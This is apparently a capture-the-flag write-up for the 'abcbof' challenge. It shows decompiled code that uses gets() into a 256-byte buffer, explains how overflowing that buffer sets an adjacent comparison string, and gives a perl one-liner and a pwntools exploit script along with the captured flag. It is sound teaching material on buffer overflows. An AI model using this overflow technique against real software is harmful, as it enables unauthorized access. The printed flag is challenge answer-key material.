# abcbof

## Description

Author: Lunga

```
nc chals20.cybercastors.com 14424
```

## Analysis

Open the binary with Ghidra and look at `main()`. This one is really simple.

```
undefined8 main(void)

{
  int iVar1;
  char local_118 [256];
  char local_18 [16];
  
  printf("Hello everyone, say your name: ");
  gets(local_118);
  iVar1 = strcmp("CyberCastors",local_18);
  if (iVar1 == 0) {
    get_flag();
  }
  puts("You lose!");
  return 0;
}
```

If `local_18` contains "CyberCastors", then it invokes `get_flag()`. `local_18` is right after our input buffer `local_118`, so all we have to do is overflow the input buffer. Write 256 chars to fill up the input buffer and then "CyberCastors" immediately after that.

## Solution

Try it out locally first.

```
root@kali:~/Downloads# cat flag.txt 
hello
root@kali:~/Downloads# perl -e 'print "A"x256 . "CyberCastors"' | ./abcbof
Hello everyone, say your name: hello
```

Now write up a script to get the real flag from the remote server.

```
root@kali:~/Downloads# cat abcbof-exploit.py 
#!/usr/bin/env python3
from pwn import *
p = remote('chals20.cybercastors.com', 14424)
payload = b'A' * (256)
payload += b'CyberCastors'
p.recvuntil('say your name:')
p.sendline(payload)
p.interactive()
root@kali:~/Downloads# ./abcbof-exploit.py 
[+] Opening connection to chals20.cybercastors.com on port 14424: Done
[*] Switching to interactive mode
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACyberCastors
castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}[*] Got EOF while reading in interactive
$ 
```

The flag is:

```
castorsCTF{b0f_4r3_n0t_th4t_h4rd_or_4r3_th3y?}
```

